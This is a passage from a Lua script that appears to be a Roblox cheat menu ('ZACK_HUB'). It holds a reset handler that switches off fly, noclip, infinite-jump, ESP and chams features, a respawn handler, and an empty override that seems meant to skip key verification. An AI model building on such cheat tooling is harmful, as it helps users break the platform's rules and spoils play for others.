    borderColorBtn.Text = "BORDER"
    

    if flying then
        flying = false
        flyToggle.Text = "FLY: OFF"
        humanoid.PlatformStand = false
    end
    if noclip then
        noclip = false
        noclipBtn.Text = "NOCLIP: OFF"
    end
    if infJump then
        infJump = false
        infJumpBtn.Text = "INF JUMP: OFF"
    end
    if headless then
        headless = false
        headlessBtn.Text = "HEADLESS: OFF"
        local head = char:FindFirstChild("Head")
        if head then head.Transparency = 0 end
    end
    if espEnabled then
        espEnabled = false
        espToggle.Text = "ESP: OFF"
        clearESP()
    end
    if chamsEnabled then
        chamsEnabled = false
        chamsToggle.Text = "CHAMS: OFF"
        setPinkSky(false)
        destroySpheres()
    end
    
    showBigMessage("🔄 RESET COMPLETE")
end)

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    humanoid = char:WaitForChild("Humanoid")
    rootPart = char:WaitForChild("HumanoidRootPart")
    
    if headless then
        local head = char:FindFirstChild("Head")
        if head then head.Transparency = 1 end
    end
    
    if spheresActive then
        destroySpheres()
        createSpheres()
    end
end)

local originalVerify = keyButton.MouseButton1Click
keyButton.MouseButton1Click = function()
    

end

local userInfo = Instance.new("TextLabel")
userInfo.Parent = settingsFrame
userInfo.BackgroundTransparency = 1
userInfo.BorderSizePixel = 1
userInfo.BorderColor3 = Color3.fromRGB(255,255,255)
userInfo.Position = UDim2.new(0.05,0,0.5,0)
userInfo.Size = UDim2.new(0.9,0,0.15,0)
userInfo.Font = Enum.Font.Gotham
userInfo.Text = player.Name .. " | ID: " .. player.UserId
userInfo.TextColor3 = Color3.fromRGB(200,200,200)
userInfo.TextScaled = true

print("✅ ZACK_HUB Fully Loaded")
print("🔑 TG: @sajkyn")
